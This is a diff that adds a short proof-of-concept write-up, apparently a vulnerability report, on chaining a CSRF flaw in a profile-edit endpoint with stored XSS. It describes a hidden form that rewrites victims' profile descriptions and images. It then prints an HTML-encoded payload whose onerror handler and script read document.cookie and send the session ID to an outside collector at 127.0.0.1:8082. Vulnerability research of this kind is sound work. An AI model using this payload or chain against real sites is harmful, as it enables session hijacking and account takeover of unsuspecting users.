@@ -1,0 +1,13 @@
+The CSRF vulnerability is possible due to the fact that the "id" variable referenced in the URL is fake, and even sending undefined will actually just
+edit the current logged in user profile, as it uses the session cookie stored the browser to do it. One simple way to do it was to take the CSRF token, embed it
+in a hidden form that will edit the user description to a bogus one motivating the users to visit the infected site, and changing the user's pfp for a broken one,
+that onerror event will trigger the cookie stealing method explained in the XSS PoC.
+
+The vulnerabilty is already proven, being able to edit the user description. However. I'm finding problems encoding the XSS payload to be sent via a hidden form.
+
+With a bit of HTML encoding, the final payload ended up looking like this:
+
+"/&quot;onerror=&quot;console.log(document.cookie)&quot;&gt;&lt;script&gt;
+var a = new XMLHttpRequest({mozSystem: true}); 
+a.open('GET', 'http://127.0.0.1:8082/incoming' + '?sessionId=' + document.cookie.replace('session=', ''), true); a.send(); 
+&lt;/script&gt;&quot;.png"
